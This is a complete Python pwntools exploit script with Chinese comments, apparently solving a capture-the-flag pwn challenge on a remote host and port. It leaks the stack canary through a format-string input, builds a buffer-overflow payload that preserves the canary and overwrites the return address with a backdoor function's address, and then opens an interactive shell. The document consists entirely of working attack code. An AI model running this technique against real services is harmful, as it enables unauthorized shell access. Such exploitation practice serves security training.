#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

# 目标配置
HOST = '39.96.193.120'
PORT = 10018

# 设置二进制文件（用于自动获取架构等信息，不是必需的）
context.binary = './attachment-5'
context.log_level = 'debug'  # 调试时打印收发数据，实际使用可改为 'info'

# 后门函数地址（从题目分析得到）
GETSHELL_ADDR = 0x080491C6

def exploit():
    # 建立连接
    r = remote(HOST, PORT)

    # ---------- 第一步：泄露 Canary ----------
    # 经测试，Canary 位于格式字符串的第 31 个参数位置
    # 发送格式字符串 %31$p 可泄露其值
    r.sendline(b'%31$p')  # sendline 会发送换行符，正好完成 read

    # 接收 "Hello Hacker!" 提示信息
    r.recvuntil(b'Hello Hacker!\n')

    # 接收泄露的 Canary 值（如 "0xdf532500"）
    leak = r.recvline(keepends=False).decode().strip()
    log.info(f"Leaked raw: {leak}")

    # 解析 Canary（16 进制字符串转整数）
    try:
        canary = int(leak, 16)
    except ValueError:
        log.error("Failed to parse canary, raw leak: {}".format(leak))
        r.close()
        return

    log.success(f"Leaked canary: {hex(canary)}")

    # ---------- 第二步：构造溢出 payload ----------
    # 缓冲区 buf 距离 ebp 为 0x70 (112 字节)
    # Canary 位于 ebp - 0x0C (ebp 上面 12 字节处)
    # 因此 buf 到 canary 的偏移 = 0x70 - 0x0C = 100 字节
    offset_to_canary = 100

    # 构造 payload：
    # [ 100 个填充字节 ] + [ 4 字节 canary ] + [ 12 字节对齐/旧EBP ] + [ 4 字节返回地址 ]
    payload  = b'A' * offset_to_canary
    payload += p32(canary)                    # 原始 canary 值
    payload += b'B' * 12                      # 覆盖可能存在的对齐空间及旧的 EBP
    payload += p32(GETSHELL_ADDR)             # 返回地址指向后门函数

    # 发送 payload（注意：第二次 read 仍然在等待输入，不要用 sendline 避免多余换行）
    r.send(payload)

    # 获得交互式 shell
    r.interactive()

if __name__ == '__main__':
    exploit()